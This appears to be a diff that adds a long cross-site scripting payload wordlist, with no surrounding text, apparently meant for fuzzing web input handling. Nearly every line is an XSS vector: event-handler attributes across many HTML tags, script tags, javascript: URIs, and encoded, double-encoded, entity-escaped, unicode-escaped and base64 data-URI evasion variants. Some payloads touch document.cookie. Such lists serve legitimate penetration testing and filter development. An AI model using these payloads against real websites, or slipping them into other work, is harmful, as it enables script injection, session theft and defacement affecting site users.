+%253Cvideo src=x onload=alert(1)%253E
+<a ondrop='alert(1)'>
+<img src=x onerror=alert(17)>
+javascript:alert(64)
+<select onkeyup="alert(1)">
+&lt;svg onload=alert(1)&gt;
+<embed ondrop='alert(1)'>
+<svg onsubmit=alert(1)>
+<button ondrop="alert(1)">
+<marquee onfocus="alert(1)">
+<img ondrag="alert(1)">
+<textarea onmouseenter="alert(1)">
+<td onchange=alert(1)>
+<span onmouseover=alert(1)>
+<script>alert(document.domain)</script>
+<body onmouseenter='alert(1)'>
+<textarea onkeyup=alert(1)>
+<audio onkeypress='alert(1)'>
+<select onmouseleave=alert(1)>
+javascript:alert(38)
+<td onmouseover='alert(1)'>
+<link onchange="alert(1)">
+<td ondblclick='alert(1)'>
+<marquee onkeypress="alert(1)">
+javascript:alert(7)
+%253Caudio onerror="alert(1)"%253E
+<marquee onwheel="alert(1)">
+<img src=x onerror=alert(98)>
+<video onclick="alert(1)">
+<input onblur=alert(1)>
+<script>alert(40)</script>
+javascript:alert(79)
+<span onkeydown=alert(1)>
+<div onkeydown=alert(1)>
+<video ondrop="alert(1)">
+%253Cbody onload="alert(1)"%253E
+<span onscroll='alert(1)'>
+<audio onwheel="alert(1)">
+%3Cimg onload='alert(1)'%3E
+<embed onkeydown=alert(1)>
+&lt;audio onerror='alert(1)'&gt;
+<marquee onkeydown='alert(1)'>
+%3Cbody onload='alert(1)'%3E
+<link onmouseleave="alert(1)">
+<button oncontextmenu="alert(1)">
+&lt;iframe src=x onload=alert(1)&gt;
+<a onkeyup="alert(1)">
+<select onmouseover='alert(1)'>
+<td onblur=alert(1)>
+<svg/onload=alert(46)>
+<script>alert(13)</script>
+<form onload=alert(1)>
+<select ondrop='alert(1)'>
+<button onload="alert(1)">
+<video src=x onchange=alert(1)>
+<a onsubmit='alert(1)'>
+<img ondblclick="alert(1)">
+<video onkeyup="alert(1)">
+<details onscroll=alert(1)>
+&lt;video onload="alert(1)"&gt;
+javascript:alert(54)
+%253Cembed onerror=alert(1)%253E
+<a onscroll='alert(1)'>
+<iframe onmouseout=alert(1)>
+<body onwheel="alert(1)">
+<select onchange="alert(1)">
+<marquee onerror='alert(1)'>
+<div onscroll="alert(1)">
+<svg/onload=alert(26)>
+%253Cvideo onerror="alert(1)"%253E
+<script>alert(9)</script>
+<audio onmouseout=alert(1)>
+<link onload='alert(1)'>
+<form onkeydown=alert(1)>
+&lt;script&gt;setTimeout(alert(1),0)&lt;/script&gt;
+<marquee oncontextmenu='alert(1)'>
+<audio src=x onload=alert(1)>
+&lt;select onerror=alert(1)&gt;
+%3Caudio onload=alert(1)%3E
+<body onmouseleave='alert(1)'>
+<textarea onwheel="alert(1)">
+%253Cscript%253Ealert(document.domain)%253C/script%253E
+<form onblur="alert(1)">
+javascript:alert(63)
+<select onscroll=alert(1)>
+%253Ca onerror="alert(1)"%253E
+<marquee onwheel='alert(1)'>
+<span onmouseleave="alert(1)">
+%253Ciframe onerror='alert(1)'%253E
+<svg/onload=alert(7)>
+<a onload="alert(1)">
+<form oncontextmenu="alert(1)">
+<body onload='alert(1)'>
+<svg/onload=alert(34)>
+<iframe onchange=alert(1)>
+<svg onmouseenter=alert(1)>
+<link oncontextmenu=alert(1)>
+<img src=x onerror=alert(66)>
+<input onmouseover=alert(1)>
+%3Ctable onerror='alert(1)'%3E
+<script>alert(25)</script>
+<textarea onwheel=alert(1)>
+<svg/onload=alert(33)>
+<audio src=x onscroll=alert(1)>
+<audio src=x onfocus=alert(1)>
+<select oninput="alert(1)">
+%3Ctextarea onerror=alert(1)%3E
+%3Ctextarea onerror="alert(1)"%3E
+<span onmouseleave='alert(1)'>
+<body onerror='alert(1)'>
+<video onmouseleave=alert(1)>
+<iframe oncontextmenu=alert(1)>
+<td onkeydown='alert(1)'>
+<details onblur="alert(1)">
+<a oninput="alert(1)">
+&lt;input onerror='alert(1)'&gt;
+<body onscroll=alert(1)>
+&lt;body onerror="alert(1)"&gt;
+<button onkeyup="alert(1)">
+<embed ondrag='alert(1)'>
+<button onload='alert(1)'>
+%253Cembed src=x onerror=alert(1)%253E
+<img src=x onerror=alert(36)>
+<audio onerror="alert(1)">
+<span onkeydown='alert(1)'>
+<svg/onload=alert(90)>
+<a onblur=alert(1)>
+<input onmouseleave='alert(1)'>
+<script>alert(44)</script>
+<div onmouseleave='alert(1)'>
+<span onfocus="alert(1)">
+<iframe oninput=alert(1)>
+<select oninput='alert(1)'>
+<img src=x onerror=alert(23)>
+<input onclick='alert(1)'>
+<div oninput="alert(1)">
+<img src=x onerror="alert(String.fromCharCode(88,83,83))">
+%253Cvideo src=x onerror=alert(1)%253E
+javascript:alert(91)
+<div onkeyup="alert(1)">
+<video src=x onmouseover=alert(1)>
+<img src=x onerror=alert(71)>
+<form ondblclick='alert(1)'>
+<iframe oncontextmenu='alert(1)'>
+%253Cspan onerror='alert(1)'%253E
+<span onmouseover='alert(1)'>
+<textarea onmouseover='alert(1)'>
+<details onerror="alert(1)">
+%253Caudio src=x onerror=alert(1)%253E
+<select onfocus=alert(1)>
+<video onwheel='alert(1)'>
+<button onblur="alert(1)">
+<script>alert(73)</script>
+<embed onerror='alert(1)'>
+<embed onmouseover=alert(1)>
+<video onchange="alert(1)">
+&lt;img src=x onerror=alert(1)&gt;
+<form onmouseenter='alert(1)'>
+<video onkeyup=alert(1)>
+<svg ondblclick='alert(1)'>
+%253Cscript%253EsetInterval(alert(1),0)%253C/script%253E
+</script><script>alert(1)</script>
+javascript:alert(1)
+<script>alert(23)</script>
+<img src=x onblur=alert(1)>
+<td onfocus="alert(1)">
+<marquee onblur=alert(1)>
+<iframe onmouseleave='alert(1)'>
+<textarea onmouseenter=alert(1)>
+<img src=x onload=alert(1)>
+<td onmouseover="alert(1)">
+<form onclick=alert(1)>
+<embed oninput="alert(1)">
+<div onblur="alert(1)">
+<textarea oncontextmenu=alert(1)>
+%3Caudio onerror='alert(1)'%3E
+<body onload="alert(1)">
+<details ondblclick=alert(1)>
+<textarea onkeyup='alert(1)'>
+<link ondrop=alert(1)>
+%253Cdetails onerror=alert(1)%253E
+javascript:alert(59)
+%3Ctd onerror=alert(1)%3E
+javascript:alert(11)
+<svg/onload=alert(38)>
+%253Cinput onerror='alert(1)'%253E
+<iframe onerror="alert(1)">
+<span ondrop=alert(1)>
+<svg/onload=alert(97)>
+%3Cimg onerror='alert(1)'%3E
+<button onload=alert(1)>
+<video onload=alert(1)>
+<video src=x onkeypress=alert(1)>
+<object onerror="alert(1)">
+&lt;td onerror="alert(1)"&gt;
+<audio onscroll='alert(1)'>
+<body onwheel=alert(1)>
+<ScRiPt>alert(1)</ScRiPt>
+&lt;link onerror=alert(1)&gt;
+%3Caudio onerror="alert(1)"%3E
+<img src=x onerror=alert(22)>
+javascript:alert(47)
+javascript:alert(36)
+%253Csvg onload='alert(1)'%253E
+<embed ondblclick="alert(1)">
+<iframe src=x onkeyup=alert(1)>
+<embed ondrag=alert(1)>
+%3Cinput onerror="alert(1)"%3E
+<link onsubmit="alert(1)">
+<img src=x onkeypress=alert(1)>
+<video onclick=alert(1)>
+<img src=x onfocus=alert(1)>
+<textarea onmouseover=alert(1)>
+<marquee onerror="alert(1)">
+<link onwheel="alert(1)">
+<img onmouseleave=alert(1)>
+%253Caudio onerror='alert(1)'%253E
+%253Cmarquee onerror=alert(1)%253E
+%253Ca onerror='alert(1)'%253E
+<embed src=x onchange=alert(1)>
+<video oncontextmenu=alert(1)>
+<img src=x onerror=alert(9)>
+<script>alert(58)</script>
+<select onmouseover="alert(1)">
+<iframe src=x onblur=alert(1)>
+<link onclick="alert(1)">
+<table onmouseenter='alert(1)'>
+<textarea ondrop="alert(1)">
+%3Cembed src=x onerror=alert(1)%3E
+<body oninput='alert(1)'>
+<embed onkeypress='alert(1)'>
+<script>alert(17)</script>
+<embed onchange="alert(1)">
+&lt;script&gt;confirm(1)&lt;/script&gt;
+<body ondrop='alert(1)'>
+<input onkeydown=alert(1)>
+&lt;button onerror="alert(1)"&gt;
+<link onkeydown="alert(1)">
+<video ondrag='alert(1)'>
+<details onmouseover='alert(1)'>
+<video onkeyup='alert(1)'>
+&lt;img onerror='alert(1)'&gt;
+<img src=x onerror=alert(82)>
+<span onfocus=alert(1)>
+<div ondrop=alert(1)>
+<svg/onload=alert(41)>
+<img onkeyup='alert(1)'>
+<a onchange='alert(1)'>
+javascript:alert(93)
+<td onkeydown="alert(1)">
+<a onkeypress='alert(1)'>
+<video onfocus='alert(1)'>
+<embed onmouseenter='alert(1)'>
+<iframe oncontextmenu="alert(1)">
+<form onmouseenter=alert(1)>
+<body onkeydown=alert(1)>
+<form onmouseover='alert(1)'>
+<details oncontextmenu='alert(1)'>
+%3Cimg onerror=alert(1)%3E
+<textarea ondblclick="alert(1)">
+<object onmouseover='alert(1)'>
+<button oncontextmenu='alert(1)'>
+<div onload="alert(1)">
+<img src=x onerror=alert(1)>
+<object onmouseenter='alert(1)'>
+<form onmouseout="alert(1)">
+<script>alert(28)</script>
+<table onmouseleave=alert(1)>
+<a onclick=alert(1)>
+<body oninput="alert(1)">
+<a onkeyup=alert(1)>
+<audio ondblclick="alert(1)">
+</textarea><script>alert(1)</script>
+<img src=x onerror=alert(39)>
+<td onsubmit=alert(1)>
+<body onload=alert(1)>
+<script>alert(72)</script>
+<img ondblclick=alert(1)>
+<select onkeydown="alert(1)">
+<svg/onload=alert(35)>
+<audio onfocus="alert(1)">
+<video onkeypress=alert(1)>
+<script>alert(90)</script>
+<svg/onload=alert`1`>
+<img onfocus=alert(1)>
+<embed src=x onerror=alert(1)>
+<input onwheel="alert(1)">
+javascript:alert(18)
+<img src=x onerror=alert(32)>
+<form onblur='alert(1)'>
+<img src=x ondrop=alert(1)>
+<a onfocus=alert(1)>
+<input onkeydown="alert(1)">
+<svg onmouseenter='alert(1)'>
+<embed onmouseleave="alert(1)">
+<form onload="alert(1)">
+<svg/onload=alert(19)>
+<button onwheel=alert(1)>
+javascript:alert(78)
+<select onkeypress=alert(1)>
+javascript:alert(40)
+javascript:alert(33)
+<a onchange="alert(1)">
+<script>alert(81)</script>
+<a oninput=alert(1)>
+<details onerror='alert(1)'>
+<link onblur='alert(1)'>
+<span onwheel='alert(1)'>
+<img onmouseenter='alert(1)'>
+javascript:alert(44)
+<embed src=x onfocus=alert(1)>
+<svg/onload=alert(83)>
+<script>alert(80)</script>
+&lt;marquee onerror=alert(1)&gt;
+<link ondblclick=alert(1)>
+<link onfocus="alert(1)">
+<svg/onload=alert(69)>
+<div onsubmit="alert(1)">
+<svg/onload=alert(6)>
+<svg/onload=alert(87)>
+<embed onsubmit="alert(1)">
+<iframe src=x onmouseover=alert(1)>
+&lt;span onerror='alert(1)'&gt;
+javascript:alert(19)
+<svg onkeyup='alert(1)'>
+<a onmouseover='alert(1)'>
+<object oninput='alert(1)'>
+<video src=x onerror=alert(1)>
+<link onblur=alert(1)>
+<script>alert(26)</script>
+<a onmouseout=alert(1)>
+%3Ca onerror=alert(1)%3E
+<span onclick='alert(1)'>
+<img onload="alert(1)">
+<link oninput="alert(1)">
+<audio onkeyup=alert(1)>
+javascript:alert(56)
+<iframe onmouseleave=alert(1)>
+<iframe oninput='alert(1)'>
+<input onerror='alert(1)'>
+<a onsubmit=alert(1)>
+<form ondrop='alert(1)'>
+<embed onscroll='alert(1)'>
+%3Cdiv onerror='alert(1)'%3E
+<object onclick="alert(1)">
+<a onload=alert(1)>
+&lt;video onerror="alert(1)"&gt;
+%253Cform onerror="alert(1)"%253E
+<img src=x onerror=alert(43)>
+<span onkeypress="alert(1)">
+<input oncontextmenu='alert(1)'>
+%253Cobject onerror=alert(1)%253E
+<video src=x onscroll=alert(1)>
+<span onclick="alert(1)">
+<table onfocus='alert(1)'>
+<select ondblclick='alert(1)'>
+<select ondrop=alert(1)>
+<input onfocus=alert(1) autofocus>
+<script>alert(12)</script>
+<body ondblclick="alert(1)">
+<table onchange="alert(1)">
+<body onscroll='alert(1)'>
+<audio onscroll=alert(1)>
+<embed onmouseleave='alert(1)'>
+<span ondrag=alert(1)>
+<a onwheel="alert(1)">
+<table ondrag="alert(1)">
+<svg/onload=alert(22)>
+<svg/onload=alert(96)>
+<input onload=alert(1)>
+<div onscroll=alert(1)>
+<link onsubmit='alert(1)'>
+<marquee onload="alert(1)">
+<video src=x onkeydown=alert(1)>
+<img src=x onerror=alert(83)>
+<svg onload=alert(1)>
+<body onsubmit=alert(1)>
+<table onmouseover="alert(1)">
+<iframe onscroll=alert(1)>
+%3Cscript%3Ealert('XSS')%3C/script%3E
+&lt;audio onerror=alert(1)&gt;
+<a onmouseenter=alert(1)>
+<svg/onload=alert(40)>
+%253Ciframe onerror="alert(1)"%253E
+<table ondblclick="alert(1)">
+<audio src=x ondblclick=alert(1)>
+<embed onclick=alert(1)>
+<td onmouseenter='alert(1)'>
+<marquee ondrop='alert(1)'>
+<a onmouseleave="alert(1)">
+%253Cvideo onerror='alert(1)'%253E
+<audio onmouseover=alert(1)>
+<svg onkeyup=alert(1)>
+<audio src=x ondrop=alert(1)>
+<img src=x onerror=alert(20)>
+<select onerror='alert(1)'>
+<svg/onload=alert(70)>
+<td oninput="alert(1)">
+<svg onscroll=alert(1)>
+<video onchange=alert(1)>
+%253Cimg onload="alert(1)"%253E
+<a ondrag='alert(1)'>
+<img src=x onerror=alert(2)>
+<textarea onload="alert(1)">
+<img oncontextmenu=alert(1)>
+<video src=x onload=alert(1)>
+<img src=x onerror=alert(72)>
+<link onkeydown=alert(1)>
+<embed onkeyup=alert(1)>
+<details onblur=alert(1)>
+%253Cobject onerror="alert(1)"%253E
+<svg ondrag='alert(1)'>
+&lt;embed onerror='alert(1)'&gt;
+<table onkeydown=alert(1)>
+<textarea ondrag='alert(1)'>
+<body onmouseenter="alert(1)">
+<marquee onfocus='alert(1)'>
+<span onblur="alert(1)">
+<iframe src=x onchange=alert(1)>
+<td onmouseout=alert(1)>
+<input onchange=alert(1)>
+<td onerror="alert(1)">
+<video onfocus=alert(1)>
+<embed src=x onkeyup=alert(1)>
+<span onkeypress=alert(1)>
+<object onclick=alert(1)>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+<video src=x onmouseleave=alert(1)>
+<iframe src=x onclick=alert(1)>
+<script>alert(85)</script>
+<button onfocus=alert(1)>
+%253Cimg onload=alert(1)%253E
+<button onkeydown='alert(1)'>
+<embed onmouseout="alert(1)">
+%253Cinput onload="alert(1)"%253E
+&lt;form onerror=alert(1)&gt;
+<svg onerror='alert(1)'>
+<object onfocus='alert(1)'>
+<link onscroll=alert(1)>
+<video onsubmit="alert(1)">
+<embed src=x onscroll=alert(1)>
+<svg/onload=alert(75)>
+<svg onerror=alert(1)>
+<svg/onload=alert(76)>
+&lt;link onerror="alert(1)"&gt;
+<object ondblclick="alert(1)">
+<body onerror=alert(1)>
+<a onchange=alert(1)>
+<script>alert(82)</script>
+<body onmouseleave="alert(1)">
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+<a onerror='alert(1)'>
+<textarea onmouseout=alert(1)>
+javascript:alert(4)
+<img src=x onmouseover=alert(1)>
+<audio oncontextmenu='alert(1)'>
+<script>alert(34)</script>
+<img onclick='alert(1)'>
+<body onfocus=alert(1)>
+<svg onscroll="alert(1)">
+<body onkeydown="alert(1)">
+%3Cscript%3Econfirm(1)%3C/script%3E
+<svg/onload=alert(29)>
+<link onwheel='alert(1)'>
+<a oninput='alert(1)'>
+%253Cscript%253EsetTimeout(alert(1),0)%253C/script%253E
+<form onsubmit='alert(1)'>
+<img src=x onerror=alert(54)>
+<svg onkeypress=alert(1)>
+<input onsubmit='alert(1)'>
+<img onmouseout=alert(1)>
+<iframe onmouseleave="alert(1)">
+<svg/onload=alert(64)>
+javascript:alert(97)
+<svg ondrop="alert(1)">
+javascript:alert(65)
+&lt;input onload='alert(1)'&gt;
+<img src=x onerror=alert(61)>
+<marquee onmouseover=alert(1)>
+javascript:alert(83)
+<details onload="alert(1)">
+<input onmouseleave=alert(1)>
+%3Clink onerror="alert(1)"%3E
+javascript:alert(46)
+<body onkeyup="alert(1)">
+<details onkeyup=alert(1)>
+<button onblur=alert(1)>
+<body oncontextmenu="alert(1)">
+<object onkeydown="alert(1)">
+<table onclick=alert(1)>
+%3Cscript%3Eeval(alert(1))%3C/script%3E
+&lt;form onerror='alert(1)'&gt;
+<embed onclick='alert(1)'>
+<script>alert(61)</script>
+&lt;select onerror="alert(1)"&gt;
+%253Ciframe onload='alert(1)'%253E
+<input ondrop=alert(1)>
+<img src=x onerror=alert(37)>
+<img src='x' onerror='alert(1)'>
+%253Cembed onerror="alert(1)"%253E
+javascript:alert(34)
+<svg/onload=alert(9)>
+<embed onchange='alert(1)'>
+<\u0073cript>alert('XSS')</\u0073cript>
+<audio onmouseout='alert(1)'>
+<body onblur=alert(1)>
+%3Ciframe onload='alert(1)'%3E
+javascript:alert(81)
+<svg ondrop=alert(1)>
+<input oninput='alert(1)'>
+<img src=x onerror=alert(51)>
+<script>alert(84)</script>
+<input onmouseover="alert(1)">
+<video onkeydown="alert(1)">
+javascript:alert(22)
+%3Cobject onerror="alert(1)"%3E
+&lt;marquee onerror="alert(1)"&gt;
+<details onscroll='alert(1)'>
+<form onmouseleave='alert(1)'>
+javascript:alert(32)
+<input onclick="alert(1)">
+<audio src=x onkeypress=alert(1)>
+<object onmouseleave='alert(1)'>
+&lt;button onerror='alert(1)'&gt;
+<span onkeyup='alert(1)'>
+<link ondblclick='alert(1)'>
+<select onmouseout='alert(1)'>
+<button onerror='alert(1)'>
+<link onkeyup='alert(1)'>
+&lt;table onerror='alert(1)'&gt;
+<select onwheel="alert(1)">
+<link ondrop='alert(1)'>
+%253Clink onerror='alert(1)'%253E
+<script>alert(3)</script>
+%253Cbody onerror=alert(1)%253E
+<body onclick="alert(1)">
+<object onwheel='alert(1)'>
+javascript:alert(29)
+<select onmouseenter='alert(1)'>
+<link onkeypress='alert(1)'>
+javascript:alert(94)
+<table ondrop='alert(1)'>
+<select ondrag='alert(1)'>
+<svg onclick=alert(1)>
+<img oninput='alert(1)'>
+<details onmouseleave=alert(1)>
+javascript:alert(99)
+javascript:alert(25)
+<script>alert(51)</script>
+%3Clink onerror=alert(1)%3E
+javascript:alert(28)
+<textarea onscroll='alert(1)'>
+<img oncontextmenu='alert(1)'>
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+<button onclick='alert(1)'>
+%253Cdiv onerror='alert(1)'%253E
+<details onwheel="alert(1)">
+<textarea onclick=alert(1)>
+<video onkeypress='alert(1)'>
+&lt;object onerror="alert(1)"&gt;
+&lt;iframe src=x onerror=alert(1)&gt;
+<svg/onload=alert(20)>
+<iframe ondblclick=alert(1)>
+<video oninput='alert(1)'>
+<svg/onload=alert(24)>
+<img onwheel='alert(1)'>
+<img src=x onerror=alert(6)>
+<button ondrop='alert(1)'>
+<audio onclick="alert(1)">
+<marquee ondblclick='alert(1)'>
+<video onclick='alert(1)'>
+<button onmouseover=alert(1)>
+<a onerror=alert(1)>
+<img src=x onerror=alert(59)>
+&lt;textarea onerror="alert(1)"&gt;
+<script>alert(55)</script>
+<img src=x onerror=alert(74)>
+<object onerror='alert(1)'>
+<span onerror=alert(1)>
+<input onmouseenter='alert(1)'>
+<table onerror="alert(1)">
+<marquee onkeydown="alert(1)">
+<link onmouseleave='alert(1)'>
+<video onscroll=alert(1)>
+<svg/onload=alert(78)>
+<iframe onsubmit="alert(1)">
+<script>eval(alert(1))</script>
+<img src=x onerror=alert(33)>
+<svg/onload=alert(77)>
+<table onblur="alert(1)">
+<svg/onload=alert(86)>
+<script>alert(68)</script>
+<svg onchange=alert(1)>
+<img src=x onerror=alert(89)>
+%3Cdetails onerror=alert(1)%3E
+<button onscroll='alert(1)'>
+<svg onmouseout=alert(1)>
+<table onmouseover=alert(1)>
+%253Cimg onerror="alert(1)"%253E
+<link onscroll="alert(1)">
+&lt;div onerror='alert(1)'&gt;
+<textarea onsubmit="alert(1)">
+<marquee onmouseout=alert(1)>
+<object ondrag=alert(1)>
+<textarea onkeydown=alert(1)>
+<table ondrop=alert(1)>
+<div onscroll='alert(1)'>
+%253Caudio onload=alert(1)%253E
+<span ondrag="alert(1)">
+<img src=x onerror=alert(53)>
+<form onkeydown='alert(1)'>
+<svg/onload=alert(93)>
+<select onchange=alert(1)>
+<img src=x onerror=alert(73)>
+&lt;img onload=alert(1)&gt;
+<div onkeydown='alert(1)'>
+<video ondblclick="alert(1)">
+%253Cvideo onload=alert(1)%253E
+<marquee onerror=alert(1)>
+<iframe onload=alert(1)>
+<input onsubmit=alert(1)>
+%253Cbutton onerror=alert(1)%253E
+<details ondrop='alert(1)'>
+<marquee ondrop=alert(1)>
+%253Ciframe src=x onerror=alert(1)%253E
+%253Cscript%253Econfirm(1)%253C/script%253E
+<select onmouseout=alert(1)>
+<td ondblclick="alert(1)">
+<details onwheel=alert(1)>
+<object onscroll=alert(1)>
+<select onclick=alert(1)>
+<details onkeypress="alert(1)">
+%3Cdetails onerror='alert(1)'%3E
+<img onsubmit=alert(1)>
+<svg onmouseover='alert(1)'>
+<iframe src=x ondrag=alert(1)>
+<select ondblclick="alert(1)">
+<span onclick=alert(1)>
+<script>alert(56)</script>
+<select onblur="alert(1)">
+<button onkeyup=alert(1)>
+<span onerror='alert(1)'>
+<td onscroll=alert(1)>
+<div ondrop='alert(1)'>
+javascript:alert(87)
+&lt;iframe onerror=alert(1)&gt;
+javascript:alert(6)
+<iframe src=x onload=alert(1)>
+<video onsubmit='alert(1)'>
+<embed src=x onmouseout=alert(1)>
+<svg onmouseleave='alert(1)'>
+<marquee onmouseout='alert(1)'>
+<button onmouseover="alert(1)">
+<link oninput='alert(1)'>
+<button onmouseenter='alert(1)'>
+<svg/onload=alert(81)>
+<span onscroll=alert(1)>
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
+<svg/onload=alert(65)>
+<img/src=x/onerror=alert(1)>
+<img src=x onerror=alert(87)>
+<table oninput='alert(1)'>
+<select onload='alert(1)'>
+&lt;details onerror=alert(1)&gt;
+%253Cscript%253Ealert(1)%253C/script%253E
+<audio ondrop="alert(1)">
+<script>alert(83)</script>
+<\u0073cript>alert(document.cookie)</\u0073cript>
+<svg oninput=alert(1)>
+<details oncontextmenu=alert(1)>
+%3Cscript%3EsetTimeout(alert(1),0)%3C/script%3E
+%253Ctable onerror="alert(1)"%253E
+%253Cbody onerror='alert(1)'%253E
+<a onmouseenter='alert(1)'>
+<img src=x onerror=alert(52)>
+<details onchange=alert(1)>
+<form onfocus=alert(1)>
+%3Cselect onerror='alert(1)'%3E
+<img src=x onerror=alert(93)>
+<body onkeypress=alert(1)>
+<img oninput="alert(1)">
+javascript:alert(73)
+<form onerror='alert(1)'>
+<details onclick='alert(1)'>
+<table onerror=alert(1)>
+<table onmouseleave="alert(1)">
+<form onclick="alert(1)">
+javascript:alert(27)
+<img src=x onerror=alert(58)>
+<div onmouseover=alert(1)>
+%3Cmarquee onerror="alert(1)"%3E
+<svg/onload=alert(92)>
+<body onmouseout=alert(1)>
+<img onscroll='alert(1)'>
+&lt;body onerror='alert(1)'&gt;
+<object onchange="alert(1)">
+javascript:alert(20)
+<table onscroll="alert(1)">
+<iframe onmouseover='alert(1)'>
+%3Cspan onerror=alert(1)%3E
+<textarea onsubmit='alert(1)'>
+<svg/onload=alert(54)>
+<form onerror="alert(1)">
+<video src=x onkeyup=alert(1)>
+<td onerror='alert(1)'>
+<body onclick=alert(1)>
+<img src=x onerror=alert(24)>
+<img src=x onchange=alert(1)>
+<div onfocus="alert(1)">
+%3Cinput onload=alert(1)%3E
+<img src=x onmouseenter=alert(1)>
+<iframe src=x onkeypress=alert(1)>
+<svg ondrag=alert(1)>
+<textarea ondblclick='alert(1)'>
+<body ondrag='alert(1)'>
+<form onkeydown="alert(1)">
+<button onkeydown="alert(1)">
+<svg onwheel=alert(1)>
+<div ondrag=alert(1)>
+javascript:alert(17)
+<table onkeydown="alert(1)">
+<object onkeyup="alert(1)">
+<marquee ondrag="alert(1)">
+%253Cbutton onerror='alert(1)'%253E
+<body onblur='alert(1)'>
+<script>alert(48)</script>
+<embed ondblclick=alert(1)>
+<svg/onload=alert(21)>
+<script>alert(92)</script>
+<video onerror='alert(1)'>
+<form onsubmit="alert(1)">
+<div onerror=alert(1)>
+%3Cvideo onload="alert(1)"%3E
+<span onsubmit='alert(1)'>
+<textarea onload='alert(1)'>
+<table onsubmit='alert(1)'>
+<iframe onkeyup='alert(1)'>
+<table onkeypress=alert(1)>
+<td onmouseleave=alert(1)>
+&lt;td onerror='alert(1)'&gt;
+<script>alert(70)</script>
+<img onkeydown='alert(1)'>
+<audio onwheel=alert(1)>
+<audio onkeyup='alert(1)'>
+<td onchange='alert(1)'>
+<a onclick='alert(1)'>
+<span onmouseout=alert(1)>
+<span ondrag='alert(1)'>
+<img src=x onerror=alert(79)>
+<button onfocus='alert(1)'>
+<td onmouseleave='alert(1)'>
+<td onclick="alert(1)">
+<script>alert(15)</script>
+<script>alert(57)</script>
+<embed onload='alert(1)'>
+<span onmouseout='alert(1)'>
+<embed src=x onmouseover=alert(1)>
+%3Cscript%3Econsole.log(1)%3C/script%3E
+<video onscroll="alert(1)">
+<embed src=x onclick=alert(1)>
+<a ondblclick="alert(1)">
+javascript:alert(43)
+<script>alert(89)</script>
+<object onkeypress='alert(1)'>
+<video onblur=alert(1)>
+<audio ondrag=alert(1)>
+%3Cimg onload=alert(1)%3E
+<input ondrop='alert(1)'>
+<script>alert(32)</script>
+<svg/onload=alert(27)>
+<script>alert(77)</script>
+<div onsubmit='alert(1)'>
+<svg/onload=alert(74)>
+javascript:alert(41)
+<svg/onload=alert(67)>
+%3Cbody onerror='alert(1)'%3E
+<table oncontextmenu=alert(1)>
+<object onchange=alert(1)>
+<span onload=alert(1)>
+<marquee onsubmit=alert(1)>
+<script>alert(52)</script>
+javascript:alert(48)
+<img src=x onerror=alert(35)>
+<marquee oncontextmenu="alert(1)">
+<iframe onerror='alert(1)'>
+<object oncontextmenu=alert(1)>
+%253Cvideo onerror=alert(1)%253E
+%3Caudio onerror=alert(1)%3E
+<table onclick='alert(1)'>
+<img onsubmit='alert(1)'>
+<svg/onload=alert(45)>
+<marquee onload=alert(1)>
+javascript:alert(55)
+<svg oninput="alert(1)">
+<td ondrop=alert(1)>
+<button onblur='alert(1)'>
+<marquee onchange=alert(1)>
+javascript:alert(13)
+&lt;svg onload='alert(1)'&gt;
+&lt;select onerror='alert(1)'&gt;
+<svg/onload=alert(10)>
+%3Cembed onerror=alert(1)%3E
+<object oninput="alert(1)">
+<div oninput=alert(1)>
+<svg/onload=alert(48)>
+<img src=x onerror=alert(65)>
+<svg onmouseout="alert(1)">
+<script>alert(39)</script>
+<button onmouseleave='alert(1)'>
+<textarea onchange='alert(1)'>
+<input oninput=alert(1)>
+<svg/onload=alert(89)>
+<body onmouseleave=alert(1)>
+<input onerror="alert(1)">
+&lt;svg onerror=alert(1)&gt;
+<div onblur=alert(1)>
+<td onmouseout="alert(1)">
+&lt;table onerror="alert(1)"&gt;
+<audio src=x onblur=alert(1)>
+<marquee onmouseleave='alert(1)'>
+<details onload='alert(1)'>
+<textarea oninput='alert(1)'>
+<audio onchange="alert(1)">
+<img onwheel="alert(1)">
+%253Cform onerror='alert(1)'%253E
+<marquee onkeypress='alert(1)'>
+<marquee onload='alert(1)'>
+<svg onmouseout='alert(1)'>
+<marquee oninput=alert(1)>
+%3Cinput onload="alert(1)"%3E
+<input ondrag="alert(1)">
+<marquee onchange='alert(1)'>
+javascript:alert(45)
+<form onmouseout=alert(1)>
+<details oninput=alert(1)>
+javascript:alert(12)
+<svg/onload=alert(5)>
+<script>alert(49)</script>
+javascript:alert(60)
+<video oninput=alert(1)>
+<link onload="alert(1)">
+%253Csvg onerror=alert(1)%253E
+<details onmouseout='alert(1)'>
+<table onmouseout="alert(1)">
+<details oninput="alert(1)">
+<td onblur='alert(1)'>
+<details ondrag="alert(1)">
+&lt;div onerror=alert(1)&gt;
+<video onmouseenter=alert(1)>
+<a onload='alert(1)'>
+<img src=x onerror=alert(25)>
+<svg onwheel="alert(1)">
+<button onwheel="alert(1)">
+<script>alert(63)</script>
+<input onkeyup=alert(1)>
+<button onsubmit="alert(1)">
+<video onkeypress="alert(1)">
+<select onmouseout="alert(1)">
+<details onmouseout=alert(1)>
+<table onkeydown='alert(1)'>
+<button onmouseleave=alert(1)>
+<audio src=x ondrag=alert(1)>
+%253Cembed onerror='alert(1)'%253E
+<img onmouseover='alert(1)'>
+<span ondrop='alert(1)'>
+<link onmouseout='alert(1)'>
+<audio onerror=alert(1)>
+<img src=x onerror=alert(94)>
+<button onchange=alert(1)>
+<img src=x onerror=alert(78)>
+<video onwheel="alert(1)">
+<SCRIPT>alert(1)</SCRIPT>
+<textarea onerror="alert(1)">
+javascript:alert(75)
+<video src=x onsubmit=alert(1)>
+<object onmouseenter=alert(1)>
+%253Ctable onerror=alert(1)%253E
+<details onmouseenter='alert(1)'>
+%3Cimg src=x onload=alert(1)%3E
+<img onkeypress='alert(1)'>
+%3Cdiv onerror=alert(1)%3E
+&lt;video onload='alert(1)'&gt;
+<svg onkeypress='alert(1)'>
+<embed onblur=alert(1)>
+<body ondrop="alert(1)">
+<textarea onmouseleave=alert(1)>
+<video src=x ondrag=alert(1)>
+<form onkeyup='alert(1)'>
+<span onsubmit="alert(1)">
+<audio onfocus='alert(1)'>
+<a onscroll=alert(1)>
+<audio onsubmit="alert(1)">
+<img onmouseout="alert(1)">
+<a oncontextmenu="alert(1)">
+<audio onkeypress=alert(1)>
+%3Cbody onerror=alert(1)%3E
